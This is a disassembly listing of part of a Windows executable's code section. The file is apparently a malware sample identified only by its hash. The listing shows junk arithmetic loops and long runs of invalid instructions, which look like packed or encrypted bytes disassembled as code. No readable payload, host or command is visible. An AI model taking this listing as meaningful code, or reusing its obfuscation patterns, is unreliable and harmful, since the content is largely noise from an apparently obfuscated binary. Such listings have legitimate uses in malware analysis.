
11a1cbe0858266aa72c1b5671e1eb114e7b2dd2ac1238259fb3df51fa64571be.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433717,0x1c
  401013:	cmp    DWORD PTR ds:0x433717,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433717,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433717,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433717
  401055:	dec    eax
  401056:	mov    ds:0x433717,eax
  40105b:	mov    eax,ds:0x433717
  401060:	dec    eax
  401061:	mov    ds:0x433717,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43371b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43371f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433753
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43372f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433713
  4010b6:	mov    DWORD PTR ds:0x43372f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4337ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43372f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43372f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43372f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43372f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43372f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43372f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43372f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43372f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4336f7
  40113c:	mov    eax,ds:0x4337b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43379b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43367f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43369f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4336db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [edx],dh
  4011b8:	les    ebx,FWORD PTR [edx+0x7e7e7ea8]
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    eax,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [ebx+0xf330f00],ebx
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x6829b739
  40126d:	cdq    
  40126e:	mov    DWORD PTR [ecx],esi
  401270:	and    BYTE PTR [ecx],dl
  401272:	pop    ds
  401273:	xchg   bl,ah
  401275:	es sub eax,0x75976fc4
  40127b:	xchg   ecx,eax
  40127c:	pushf  
  40127d:	add    esi,DWORD PTR [ebx+0x6a587048]
  401283:	cmc    
  401284:	popa   
  401285:	int3   
  401286:	in     al,0x3e
  401288:	pusha  
  401289:	mov    ds:0xe6df2d88,eax
  40128e:	sub    BYTE PTR [edi],bh
  401290:	aad    0x9b
  401292:	add    dh,BYTE PTR [eax]
  401294:	adc    ebp,edx
  401296:	mov    dl,0x7b
  401298:	call   0xee9ff8c1
  40129d:	imul   ecx,DWORD PTR [edx+0xb],0x5ae67955
  4012a4:	data16 mov al,0x5c
  4012a7:	pop    ebp
  4012a8:	leave  
  4012a9:	cld    
  4012aa:	xchg   ecx,eax
  4012ab:	aaa    
  4012ac:	add    al,0x67
  4012ae:	scas   al,BYTE PTR es:[edi]
  4012af:	es ja  0x4012b8
  4012b2:	outs   dx,BYTE PTR ds:[esi]
  4012b3:	mov    es,WORD PTR [edx]
  4012b5:	adc    dl,BYTE PTR [eax+0x602a99e7]
  4012bb:	psadbw mm3,QWORD PTR [ebx+0x75]
  4012bf:	inc    eax
  4012c0:	lods   eax,DWORD PTR ds:[esi]
  4012c1:	inc    ebp
  4012c2:	push   edx
  4012c3:	mul    BYTE PTR [ebp-0x1edf9d41]
  4012c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012ca:	cs jmp 0xef7a:0x7d2e83c3
  4012d2:	pop    esp
  4012d3:	in     eax,dx
  4012d4:	push   ss
  4012d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012d6:	dec    edi
  4012d7:	xchg   edx,eax
  4012d8:	jnp    0x4012be
  4012da:	cmp    dh,BYTE PTR ds:0x12d82774
  4012e0:	ret    0x7e5e
  4012e3:	add    eax,DWORD PTR [eax-0x31]
  4012e6:	sub    BYTE PTR [ecx],bh
  4012e8:	mov    bh,0x45
  4012ea:	fmul   st,st(3)
  4012ec:	std    
  4012ed:	xchg   esp,eax
  4012ee:	sub    eax,0x881058d3
  4012f3:	dec    esi
  4012f4:	mov    dl,0x23
  4012f6:	test   BYTE PTR [ebx-0x21],0xcb
  4012fa:	lea    esp,[ebp+eiz*2+0x65]
  4012fe:	imul   eax,DWORD PTR [esi],0x7c
  401301:	gs jb  0x4012b6
  401304:	inc    ebp
  401305:	mov    eax,ds:0x947efb15
  40130a:	cli    
  40130b:	aaa    
  40130c:	and    BYTE PTR [ebp+0x56ea7c18],cl
  401312:	pop    ss
  401313:	jno    0x40131f
  401315:	pop    ds
  401316:	inc    ebp
  401317:	xchg   edx,eax
  401318:	or     ebp,DWORD PTR ds:[ebp-0x50f5bb7e]
  40131f:	lahf   
  401320:	sub    cl,BYTE PTR [esi-0x55239357]
  401326:	cdq    
  401327:	stos   DWORD PTR es:[edi],eax
  401328:	test   al,0x30
  40132a:	mov    bl,0x58
  40132c:	sub    ah,bl
  40132e:	jmp    0xc627:0x8f5a69af
  401335:	xchg   ebp,eax
  401336:	push   es
  401337:	ficom  DWORD PTR [ebp-0x6b]
  40133a:	cmp    BYTE PTR ds:0x9fda50ff,cl
  401340:	fst    DWORD PTR [ebx]
  401342:	shl    DWORD PTR [ebp-0x765a8f6f],cl
  401348:	inc    ebp
  401349:	hlt    
  40134a:	and    DWORD PTR ds:0x4336d3,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4336d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4336d3,ebx
  401366:	cmp    DWORD PTR ds:0x4336d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4336d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43368b,0x43367f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	dec    edx
  4013b4:	mov    bh,0x24
  4013b6:	jge    0x4013b2
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x401413
  4013c0:	dec    ebp
  4013c1:	outs   dx,DWORD PTR ds:[esi]
  4013c2:	je     0x4013c7
  4013c4:	aaa    
  4013c5:	aad    0x3a
  4013c7:	ror    DWORD PTR [edx-0x14],1
  4013ca:	dec    ecx
  4013cb:	nop
  4013cc:	cwde   
  4013cd:	pop    ebp
  4013ce:	repz (bad) 
  4013d0:	repnz and al,0x76
  4013d3:	mov    edi,0xdaae4c6a
  4013d8:	mov    esi,0x19d470cd
  4013dd:	xor    eax,0x8cd6f8d5
  4013e2:	push   cs
  4013e3:	pop    ebp
  4013e4:	jmp    0x401392
  4013e6:	xor    BYTE PTR cs:[edi+0x64],dh
  4013ea:	xor    DWORD PTR [ecx+0x626e0915],esp
  4013f0:	stos   BYTE PTR es:[edi],al
  4013f1:	enter  0xad6c,0x6d
  4013f5:	rol    BYTE PTR [edi+0x1a8114f4],cl
  4013fb:	sbb    BYTE PTR [edx-0x4c],ch
  4013fe:	mov    WORD PTR [ecx-0x6c185d43],es
  401404:	lods   eax,DWORD PTR ds:[esi]
  401406:	xor    edx,esp
  401408:	repz push edx
  40140a:	sbb    al,0x5
  40140c:	addr16 nop
  40140e:	ja     0x401435
  401410:	dec    edx
  401411:	enter  0xf3b6,0x73
  401415:	cld    
  401416:	or     al,0x53
  401418:	push   ss
  401419:	sbb    eax,0x8df0bf4c
  40141e:	scas   al,BYTE PTR es:[edi]
  40141f:	stos   DWORD PTR es:[edi],eax
  401420:	jnp    0x4013ba
  401422:	(bad)
  401426:	inc    ebx
  401427:	mov    bl,0xae
  401429:	xchg   ebp,eax
  40142a:	pushf  
  40142b:	in     eax,dx
  40142c:	iret   
  40142d:	pop    ds
  40142e:	push   ds
  40142f:	call   0x8ad2:0xb73c3aaa
  401436:	fsub   QWORD PTR ds:0x5bacbcdf
  40143c:	xlat   BYTE PTR ds:[ebx]
  40143d:	adc    DWORD PTR [edi-0x1],0xb638ac6c
  401444:	inc    eax
  401445:	mov    ds:0x7ded2ad7,eax
  40144a:	xchg   ebx,eax
  40144b:	push   ebp
  40144c:	jge    0x40140c
  40144e:	scas   eax,DWORD PTR es:[edi]
  40144f:	pop    eax
  401450:	and    eax,esp
  401452:	push   edi
  401453:	icebp  
  401454:	dec    edi
  401455:	pushf  
  401456:	fsubrp st(6),st
  401458:	xor    BYTE PTR [edx+0x3201ce10],bl
  40145e:	sub    al,0x8f
  401460:	xchg   ecx,eax
  401461:	sub    al,dh
  401463:	mov    edx,0xdd044769
  401468:	sub    DWORD PTR [eax+0x1f73e50a],0xfffffffc
  40146f:	sahf   
  401470:	pop    ebx
  401471:	sahf   
  401472:	and    eax,0x81c7b24d
  401477:	ret    
  401478:	test   BYTE PTR [ebx-0x1f],ah
  40147b:	push   ss
  40147c:	ficomp DWORD PTR [edx-0x1aff4be1]
  401482:	pop    esp
  401483:	jl     0x40141c
  401485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401487:	outs   dx,BYTE PTR ds:[esi]
  401488:	cmp    al,cl
  40148a:	or     DWORD PTR [ebp-0x712eaff8],0xffffff9f
  401491:	ds pop esp
  401493:	jecxz  0x4014d9
  401495:	sti    
  401496:	pop    esi
  401497:	xchg   ebp,eax
  401498:	fmul   st(3),st
  40149a:	cmp    BYTE PTR [eax+0x5d],cl
  40149d:	popa   
  40149e:	ss xchg edi,eax
  4014a0:	mov    ds:0x70cfdc02,eax
  4014a5:	aaa    
  4014a6:	ret    0xe42d
  4014a9:	das    
  4014aa:	sub    edx,DWORD PTR [edx+0x1d]
  4014ad:	ret    
  4014ae:	jmp    0x401464
  4014b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014b1:	inc    esp
  4014b2:	cmp    esi,ebx
  4014b4:	retf   
  4014b5:	aas    
  4014b6:	sbb    edi,DWORD PTR [esi-0xc0692a9]
  4014bc:	pop    ebp
  4014bd:	ror    DWORD PTR [ecx-0x49],0xa4
  4014c1:	lods   al,BYTE PTR ds:[esi]
  4014c2:	popa   
  4014c3:	pop    ebx
  4014c4:	inc    esi
  4014c5:	add    DWORD PTR [edx-0x7f],ecx
  4014c8:	(bad)  
  4014c9:	sahf   
  4014ca:	mov    WORD PTR [ebx-0x54eee80b],?
  4014d0:	dec    ecx
  4014d1:	pop    ds
  4014d2:	adc    bh,BYTE PTR [ecx-0x189d77d]
  4014d8:	push   ebp
  4014d9:	lds    ebp,FWORD PTR [eax+edx*2-0x36]
  4014dd:	adc    BYTE PTR [eax+edx*8-0x59],bl
  4014e1:	jo     0x401535
  4014e3:	dec    ebp
  4014e4:	mov    al,0xc2
  4014e6:	call   0xfc2eab10
  4014eb:	mov    gs,WORD PTR [esi-0x16]
  4014ee:	jno    0x4014ce
  4014f0:	xchg   bl,bh
  4014f2:	mov    fs,edx
  4014f4:	cdq    
  4014f5:	adc    eax,0x4cfe3f21
  4014fa:	dec    DWORD PTR [ecx]
  4014fc:	ficomp WORD PTR [ecx-0xd]
  4014ff:	pop    es
  401500:	das    
  401501:	bound  eax,QWORD PTR [ebp-0x1b89125a]
  401507:	in     al,dx
  401508:	pushf  
  401509:	lods   eax,DWORD PTR ds:[esi]
  40150a:	inc    eax
  40150b:	in     al,0x18
  40150d:	xchg   ebp,eax
  40150e:	mov    ecx,0x8176b46f
  401513:	jo     0x4014c0
  401515:	stos   DWORD PTR es:[edi],eax
  401516:	jle    0x401533
  401518:	popa   
  401519:	push   ecx
  40151a:	push   edx
  40151b:	scas   eax,DWORD PTR es:[edi]
  40151c:	or     bh,BYTE PTR [ebp-0x7c]
  40151f:	arpl   si,dx
  401521:	jmp    0x8d76:0x4e349eaa
  401528:	gs jo  0x401578
  40152b:	jmp    0x401572
  40152d:	rol    BYTE PTR [ecx],cl
  40152f:	sbb    eax,0x8cba06ee
  401534:	inc    ebx
  401535:	jno    0x401544
  401537:	sbb    BYTE PTR [eax+ecx*4+0x7e],0x65
  40153c:	ret    
  40153d:	mov    eax,DWORD PTR ds:0x4a019ea8
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43368f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x89e5be3]
  401564:	mov    al,0x6
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x40155b
  40156e:	(bad)  
  40156f:	xchg   edx,eax
  401570:	and    DWORD PTR [edx],edi
  401572:	or     eax,0x8db80c07
  401577:	lds    edx,FWORD PTR [ecx]
  401579:	jp     0x40159c
  40157b:	push   0x81b7fdb1
  401580:	mov    cl,0xd3
  401582:	fidiv  WORD PTR [edi]
  401584:	dec    ebp
  401585:	mov    al,ds:0xc8013629
  40158a:	push   edx
  40158b:	inc    esp
  40158c:	and    BYTE PTR [ebx],0x51
  40158f:	cmp    DWORD PTR [ecx+0x159f2bdb],edx
  401595:	mov    esp,0x44b43056
  40159a:	xor    ch,ch
  40159c:	aad    0x59
  40159e:	outs   dx,BYTE PTR ds:[esi]
  40159f:	and    edx,DWORD PTR [ebx+0x2da55e65]
  4015a5:	add    BYTE PTR [ebx],ch
  4015a7:	push   ecx
  4015a8:	cdq    
  4015a9:	icebp  
  4015aa:	mov    ecx,0xc70e7b7b
  4015af:	inc    ebp
  4015b0:	xchg   edx,eax
  4015b1:	jno    0x40154e
  4015b3:	or     al,0xf3
  4015b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b6:	fdivr  QWORD PTR [ebx-0x19b158fa]
  4015bc:	adc    al,0x23
  4015be:	mov    bl,0xbe
  4015c0:	cmc    
  4015c1:	ret    
  4015c2:	jg     0x4015fc
  4015c4:	(bad)  
  4015c5:	aad    0xb8
  4015c7:	je     0x401549
  4015c9:	dec    edx
  4015ca:	adc    eax,0xd1491888
  4015cf:	and    bl,dl
  4015d1:	add    eax,0x6c31401c
  4015d6:	push   0x823072d6
  4015db:	xor    edx,DWORD PTR [ebp-0x5d6f89e7]
  4015e1:	sub    al,0xb7
  4015e3:	daa    
  4015e4:	adc    al,BYTE PTR [esp+ebp*8]
  4015e7:	sub    DWORD PTR [ebx-0x4],0xd0253026
  4015ee:	je     0x401628
  4015f0:	push   ebx
  4015f1:	mov    ebp,0x6eeb199b
  4015f6:	fisubr DWORD PTR [eax]
  4015f8:	shr    BYTE PTR [ecx-0x6ce35bf2],0xb9
  4015ff:	jbe    0x4015f8
  401601:	cmp    eax,0x1fc42e1f
  401606:	jae    0x4015ac
  401608:	pop    ds
  401609:	inc    edx
  40160a:	xchg   esi,eax
  40160b:	mov    eax,ds:0xc3467d57
  401610:	nop
  401611:	fadd   QWORD PTR [ebp+0x238d6516]
  401617:	cmp    eax,0x3e27dfc6
  40161c:	push   esi
  40161d:	xlat   BYTE PTR ds:[ebx]
  40161e:	mov    dl,0xcf
  401620:	sub    edx,esi
  401622:	sbb    dl,0xf8
  401625:	pusha  
  401626:	push   ds
  401627:	xor    bh,BYTE PTR [eax-0xc7c3aed]
  40162d:	fild   WORD PTR [ecx-0x72]
  401630:	sub    ch,BYTE PTR [edx]
  401632:	xor    bl,ah
  401634:	inc    esi
  401635:	cmp    esp,DWORD PTR [esi+edi*1]
  401638:	jl     0x4015ca
  40163a:	(bad)  
  40163b:	sahf   
  40163c:	(bad)  
  40163e:	test   BYTE PTR [esi-0x264a1a90],dh
  401644:	jl     0x4016a4
  401646:	ins    BYTE PTR es:[edi],dx
  401647:	dec    ebx
  401648:	jbe    0x401634
  40164a:	pop    ds
  40164b:	push   es
  40164c:	sti    
  40164d:	add    edx,ebx
  40164f:	push   esi
  401650:	dec    edi
  401651:	cdq    
  401652:	jae    0x401694
  401654:	aaa    
  401655:	ja     0x401625
  401657:	xchg   esi,eax
  401658:	int3   
  401659:	daa    
  40165a:	add    al,0x1e
  40165c:	nop
  40165d:	jg     0x401692
  40165f:	sub    bl,BYTE PTR [ebx]
  401661:	xchg   esi,eax
  401662:	xchg   ebx,eax
  401663:	ss xor eax,0x18869419
  401669:	(bad)  
  40166a:	mov    ecx,0x1769a1ec
  40166f:	push   eax
  401670:	repnz adc al,0x6a
  401673:	adc    BYTE PTR [ebx+0x65],ch
  401676:	bound  ecx,QWORD PTR [edx+0x44c6f1f6]
  40167c:	xchg   ebp,eax
  40167d:	mov    edx,0xd16157a4
  401682:	xor    ch,BYTE PTR [edi]
  401684:	mov    bl,0x88
  401686:	(bad)  
  401687:	mov    cl,0xff
  401689:	ret    0x9fda
  40168c:	adc    eax,0xeb111240
  401691:	add    bh,BYTE PTR ds:0x7370773b
  401697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401698:	lea    ecx,[eax]
  40169a:	dec    esp
  40169b:	add    BYTE PTR [edx-0x44],ch
  40169e:	stc    
  40169f:	rol    ch,0x20
  4016a2:	pop    ebx
  4016a3:	xchg   BYTE PTR [edi],bh
  4016a5:	adc    DWORD PTR [edi+edi*2+0x4f4e88c8],eax
  4016ac:	or     ch,BYTE PTR [eax+ecx*8-0x44a87f96]
  4016b3:	sub    BYTE PTR [ecx-0x55cdac19],dh
  4016b9:	jmp    0x401676
  4016bb:	hlt    
  4016bc:	(bad)  
  4016bd:	rcr    BYTE PTR [ebx+0x4d],1
  4016c0:	popa   
  4016c1:	add    ecx,DWORD PTR [ebp-0xb]
  4016c4:	push   ecx
  4016c5:	add    edx,DWORD PTR [edx-0x68bc9114]
  4016cb:	outs   dx,DWORD PTR ds:[esi]
  4016cc:	sub    BYTE PTR [edi-0x5c],ah
  4016cf:	inc    esi
  4016d0:	test   BYTE PTR [edi],ah
  4016d2:	ret    
  4016d3:	adc    eax,0x155392fd
  4016d8:	shl    BYTE PTR [ebx],cl
  4016da:	mov    esi,0x1d9128a5
  4016df:	mov    fs:0x5c6fded6,al
  4016e5:	mov    esp,0x9fc8271c
  4016ea:	out    dx,eax
  4016eb:	outs   dx,DWORD PTR ds:[esi]
  4016ec:	jae    0x4016a7
  4016ee:	push   edi
  4016ef:	mov    esi,?
  4016f1:	add    eax,edi
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43375f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43375f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43375f,ebx
  401721:	cmp    DWORD PTR ds:0x43375f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43375f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43375f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43375f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43375f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433683,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433697
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43368b
  401793:	and    ecx,DWORD PTR ds:0x4336db
  401799:	mov    DWORD PTR ds:0x43368b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4337af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4337af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4337af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4337af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4337af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4337af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4337af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4337af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433763,0x0
  401819:	mov    eax,ds:0x433763
  40181e:	inc    eax
  40181f:	mov    ds:0x433763,eax
  401824:	cmp    DWORD PTR ds:0x433763,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4336a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433763,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43379f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4337ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4337ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4337ab,ecx
  401878:	cmp    DWORD PTR ds:0x4337ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4337ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4337ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4337ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4337ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x95fc6ade
  4018e9:	adc    ch,bh
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x401920
  4018f4:	mov    bh,0xe8
  4018f6:	or     DWORD PTR [ebp+0x7debb3c1],ebp
  4018fc:	and    al,0x30
  4018fe:	popa   
  4018ff:	adc    ecx,DWORD PTR [eax+0x67]
  401902:	mov    WORD PTR [ecx+0x64a407],?
  401908:	inc    ecx
  401909:	dec    edx
  40190a:	adc    eax,0x8f41a757
  40190f:	test   BYTE PTR [eax-0x230e5b23],0xea
  401916:	add    dl,BYTE PTR [eax+0x28c32ee2]
  40191c:	std    
  40191d:	leave  
  40191e:	or     esi,ecx
  401920:	cli    
  401921:	mov    ah,0xd3
  401923:	sti    
  401924:	(bad)  
  401925:	or     ch,ch
  401927:	test   DWORD PTR [edi+0x23b77313],edx
  40192d:	cmp    ebx,edi
  40192f:	shr    ch,cl
  401931:	je     0x401906
  401933:	mov    edi,0x66142b3d
  401938:	jo     0x4018c3
  40193a:	lahf   
  40193b:	sbb    esp,DWORD PTR [edi-0x3a68fdb3]
  401941:	int    0xc5
  401943:	push   ebx
  401944:	fldcw  WORD PTR [ebx-0x3326cea2]
  40194a:	sub    al,0xb8
  40194c:	cmp    ebx,DWORD PTR [edx]
  40194e:	mov    ebp,ecx
  401950:	popf   
  401951:	mov    BYTE PTR [esi+0x1d6ae54a],ah
  401957:	jbe    0x4019cb
  401959:	mov    dl,BYTE PTR [ebx-0x45]
  40195c:	mov    esi,0xc47c9cc2
  401961:	pop    esi
  401962:	mov    bh,0xcc
  401964:	jp     0x40190c
  401966:	std    
  401967:	xor    bh,BYTE PTR [ecx]
  401969:	dec    ebx
  40196a:	hlt    
  40196b:	jg     0x4019bc
  40196d:	retf   
